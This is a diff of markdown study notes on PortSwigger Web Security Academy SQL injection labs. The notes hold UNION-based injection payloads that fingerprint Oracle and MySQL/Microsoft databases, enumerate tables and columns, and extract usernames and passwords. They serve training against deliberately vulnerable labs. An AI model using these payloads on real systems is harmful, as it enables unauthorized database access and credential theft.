@@ -1,6 +1,6 @@
 https://portswigger.net/web-security/sql-injection 
+https://portswigger.net/web-security/sql-injection/blind
 https://portswigger.net/web-security/sql-injection/cheat-sheet
-
 ## Labs:
 ## 1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
@@ -22,33 +22,29 @@ SQL injection attack that logs in to the application as the `administrator` us
 
 ## 3. SQL injection querying the database type and version on Oracle
 
- Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
  ```
- .../filter?category=Accessories'UNION SELECT'a','b' FROM dual--
+ 'UNION SELECT'a','b' FROM dual--
 ```
 
  Display the database version:
 ```
- .../filter?category=Accessories'UNION SELECT 'a', banner FROM v$version--
+ 'UNION SELECT 'a', banner FROM v$version--
 ```
 
 ## 4. SQL injection attack, querying the database type and version on MySQL and Microsoft
 
-Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
-
 In Microsoft database we can payload without to specify FROM table, instead we can comment with "#" right after selected columns:
  ```
- .../filter?category=Accessories'UNION SELECT'a','b'#
+ 'UNION SELECT'a','b'#
 ```
 
  Display the database version:
 ```
- .../filter?category=Accessories'UNION SELECT 'a', @@version#
+ 'UNION SELECT 'a', @@version#
  ```
 
 ## 5.SQL injection attack, listing the database contents on non-Oracle databases
 
-Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
 ```
 ' UNION SELECT 'abc','def'--
 ```
@@ -62,10 +58,28 @@ Replacing the table name to retrieve the details of the columns in the table:
 ```
 ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users_abcdef'--
 ```
-\
+
 Replacing the table and column names to retrieve the usernames and passwords for all users:
 ```
 ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
 ```
 
 ## 6.SQL injection attack, listing the database contents on Oracle
+
+```
+' UNION SELECT 'a', 'b' FROM all_tables--
+```
+
+```
+' UNION SELECT 'a', table_name FROM all_tables--
+```
+
+```
+' UNION SELECT 'a', column_name FROM all_tab_columns WHERE table_name='USERS_EIEFAP'--
+```
+
+```
+' UNION SELECT USERNAME_LFECQG, PASSWORD_MSPEUR FROM USERS_EIEFAP--
+```
+
+## 7.SQL injection UNION attack, determining the number of columns returned by the query
